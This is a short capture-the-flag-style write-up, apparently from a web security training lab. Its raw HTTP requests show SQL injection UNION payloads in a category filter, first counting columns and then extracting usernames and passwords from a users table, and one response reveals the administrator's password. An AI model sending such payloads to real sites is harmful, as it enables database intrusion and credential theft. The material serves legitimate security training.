# SQL injection UNION attack, retrieving data from other tables

### Tested how many columns are there .
**Request**
```http
GET /filter?category=Tech+gifts'+UNION+SELECT+NULL,NULL-- HTTP/2
Host: 0a1000bf045a689d81c5700300a200a9.web-security-academy.net
Cookie: session=cdQHibg0G7Pzg47H3M9fctzUUcGZAakD
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0a1000bf045a689d81c5700300a200a9.web-security-academy.net/
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers
```

**Response**
```html
HTTP/2 200 OK
Content-Type: text/html; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 9640

<!DOCTYPE html>
<html>
<!--LAB_HEAD_START-->
    <head>
        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>
        <link href=/resources/css/labsEcommerce.css rel=stylesheet>
        <title>SQL injection UNION attack, retrieving data from other tables</title>
    </head>
    [...remaining are omitted...]
```

---
### The lab told to find the data from username and password column  from users table .
**Request**
```http
GET /filter?category=Tech+gifts'+UNION+SELECT+username,password+FROM+users-- HTTP/2
Host: 0a1000bf045a689d81c5700300a200a9.web-security-academy.net
Cookie: session=cdQHibg0G7Pzg47H3M9fctzUUcGZAakD
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0a1000bf045a689d81c5700300a200a9.web-security-academy.net/
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers
```

**Response**
```html
HTTP/2 200 OK
Content-Type: text/html; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 10090

<!DOCTYPE html>
<html>
<!--LAB_HEAD_START-->
    <head>
        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>
        <link href=/resources/css/labsEcommerce.css rel=stylesheet>
        <title>SQL injection UNION attack, retrieving data from other tables</title>
    </head>
    [...remaining are omitted...]
                 <tr>
                  <th>administrator</th>
                  <td>bzkqfxfqyh7tmfh1cwnw</td>
              </tr>
              </tbody>
          </table>
      </div>
  </section>
  <div class="footer-wrapper">
  </div>
</div>
</body>
</html>
```

### Got the admin user and password .
